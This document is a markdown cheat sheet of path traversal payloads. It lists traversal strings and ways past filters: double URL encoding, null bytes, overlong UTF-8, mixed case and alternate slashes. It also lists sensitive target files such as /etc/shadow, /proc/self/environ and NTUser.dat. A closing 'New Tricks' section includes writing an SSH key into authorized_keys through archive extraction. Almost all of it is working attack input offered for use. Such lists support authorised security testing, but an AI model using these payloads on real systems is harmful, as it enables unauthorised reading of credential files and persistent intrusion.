## 🔹 Basic Payloads

- `/etc/passwd`
- `../../../etc/passwd`
- `../../../../Windows/system32/drivers/etc/hosts`

---

## 🔹 Bypass Techniques

### ➤ Dot Tricks

- `....//....//....//....//`
- `....\\/....\\/....\\/....\\/`

### ➤ URL Encoding

- `%2e%2e%2f` → `../`
- Double encode: `%252e%252e%252f`

### ➤ Null Byte Injection

- Add `%00` to bypass file extension checks
    
    Examples:
    
    - `../../../etc/passwd%00`
    - `1../../../etc/passwd%00`

### ➤ Alternate Slashes

- Use `\\`, `\\\\`, or `//` instead of `/`
    
    Examples:
    
    - `..\\..\\..\\etc\\passwd`
    - `1..\\..\\..\\etc\\passwd`

---

## 🔹 File Extensions

- Append expected extensions:
    - `../../../etc/passwd.jpg`
    - `../../../etc/passwd.php`
- Use null byte to escape extension check:
    - `../../../etc/passwd%00.jpg`

---

## 🔹 Advanced Tricks

### ➤ Case Manipulation

- Use mixed case to bypass filters:
    - `..%2F..%2F..%2FETC%2FPASSWD`
    - `1..%2F..%2F..%2FETC%2FPASSWD`

### ➤ Path Normalization Bypass

- Add extra slashes or dots:
    - `....//etc//passwd`
    - `.../.././etc/passwd`

### ➤ Encoded Characters

- Use Unicode or overlong UTF-8:
    - `%c0%ae%c0%ae/` → UTF-8 encoded `../`
    - `1%c0%ae%c0%ae/`

---

## 🔹 Windows-Specific Tricks

- Common file paths:
    - `C:/Windows/system32/drivers/etc/hosts`
    - `C:\\boot.ini`
- Alternate Data Streams:
    - `../../../file.txt::$DATA`

---

## 🔹 Common Files to Test

### Linux:

- `/etc/passwd`
- `/etc/shadow`
- `/proc/self/environ`
- `/var/log/auth.log`

### Windows:

- `C:\\Windows\\system32\\drivers\\etc\\hosts`
- `C:\\boot.ini`
- `C:\\Users\\Administrator\\NTUser.dat`

## New Tricks

### Trick 1
- Scenario: Static file route escaped web root via encoded traversal.
- Payload: `..%2f..%2f..%2fetc/passwd`

### Trick 2
- Scenario: Windows path traversal worked with backslash normalization bug.
- Payload: `..\..\..\Windows\win.ini`

### Trick 3
- Scenario: Archive extraction wrote SSH key into authorized_keys location.
- Payload: `../../../../../home/app/.ssh/authorized_keys`
